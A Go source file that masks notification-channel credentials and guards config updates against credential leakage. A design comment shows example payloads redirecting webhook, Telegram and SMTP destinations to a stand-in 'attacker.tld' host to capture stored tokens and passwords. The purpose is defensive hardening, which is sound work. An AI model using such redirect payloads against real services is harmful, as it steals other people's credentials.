package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for a masked value. When the API echoes credentials, it replaces the real content with a value bearing this prefix,
// and when the update endpoint receives a value with this prefix it understands it as "keep the stored value unchanged".
//
// A prefix is used instead of an empty string or a fixed constant so that a little identifying information can be carried along
// (see MaskedValue), letting the user tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              the original is too short, so no hint is given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying information of a Webhook address is in its trailing segment (such as WeCom's key,
// Feishu's bot id), whereas the prefix part is identical across bots and has no identifying value. The last 6 characters are not enough to
// reconstruct the credential, but enough for the configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unchanged after the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config — better to have the UI show "config unavailable"
// than to spit the whole original content, which may contain credentials, back out when the channel type cannot be recognized.
// Non-credential fields are kept as-is so the UI can display normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure like headers is treated as a single credential as a whole: judging each sub-key would require every channel
		// to declare another set of "which sub-keys are credentials" rules, whose complexity far outweighs the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed, but the caller did not
// take a stance on the credential fields". It is returned rather than silently allowing or silently dropping credentials; see PrepareConfigUpdate for the reason.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // the destination keys that changed
	Missing []string // the credential keys not explicitly declared
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate merges the channel config and handles the security-sensitive case of a "destination address change".
//
// It replaces the bare MergeConfig on the channel-update path, addressing this empirically viable path:
// the destination address (where messages go) and the credentials (what identity they are sent with) are two independent sets of fields, while MergeConfig
// keeps the stored value for any "unmentioned key". So anyone able to PATCH a channel need only **change the address and
// stay silent about the credentials** to get the server to send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header is sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real-Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is entirely silent and does not depend on redirects (so rejecting cross-host hops does not stop it),
// and directly defeats the goal of this package's masking mechanism — "credentials are not echoed to the browser".
//
// Rule: as soon as a destination key is changed to a new value, the caller must explicitly take a stance on **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential (the clearing semantics are preserved)
//   - return the masked value as-is / omit the key entirely → rejected
//
// The third is also rejected because the meaning of a "masked value" is precisely "reuse the old credential", and the old credential
// is valid only for the old address. "Automatically dropping credentials" is deliberately not done here — for optional credential fields
// (webhook's headers, email's password) that would silently become "auth is gone but the endpoint returns 200",
// harder to troubleshoot than an error. Better to make the operator re-enter once.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook's headers, which is an object) has a masked literal embedded in it,
	// it means the caller stuffed the "keep original value" sentinel inside the structure. MergeConfig only recognizes "a string
	// with the prefix" as masked, so this form would be stored as-is as a plain object — the literal
	// "__masked__" would really land in the database, with subsequent auth silently broken and no error at all. Better to reject it.
	//
	// This check must come **first**: when the address has not changed there is an early return, so putting it later would mean
	// it only covers the "address changed" path (the first version placed it wrong this way, and a test caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value counts as "not changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change, so do a normal merge (masked value keeps the original, empty string clears, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require an explicit stance on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting a masked sentinel embedded in a non-string structure.
//
// The masking mechanism assumes "the entire value is a string". An object field like webhook's headers
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored as a real value in the database.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing via JSON serialization also handles
// type differences — the port submitted by the frontend is a number, while what is read back from the database is float64, and a direct == would misjudge.
//
// "Empty" must be normalized before comparison: an empty string and "the key does not exist" are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and directly deletes the key. Without normalization, an
// optional destination field that is always left empty (Telegram's base_url is the only such field: empty means use
// the official address) would take this path —
//
//	stored as base_url:"" on creation  →  the key is deleted by MergeConfig on the first save
//	→ on the second save, incoming is "" and stored lacks the key, judged as "the address changed"
//	→ the credential is a masked value → 400 "the destination address changed, please re-enter the credential fields too"
//
// Every save afterwards fails unless the user re-pastes the Bot Token, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is "empty".
// The criterion must match MergeConfig's clearing verdict (strings.TrimSpace(s) == ""),
// otherwise a gap appears where "MergeConfig thinks it should be deleted while sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel config.
//
// Rules:
//   - a key whose value in incoming is masked → keep stored's original value (the user did not change this field)
//   - a key whose value in incoming is an empty string → treated as an explicit clear, delete the key
//   - all other keys → overwrite with incoming's value
//   - a key present in stored but not in incoming → keep (partial-update semantics)
//
// Whether an empty string counts as "clearing" needs to be explicit: the frontend form submits unfilled fields as empty strings,
// and treating it as a valid value to write would actually clear a field left "empty to keep the original value".
// Explicit clearing is chosen here, because to clear a wrongly set field the user has no other way to express it
// (dropping the field could distinguish "not provided" from "provided empty", but the UI does not need this distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
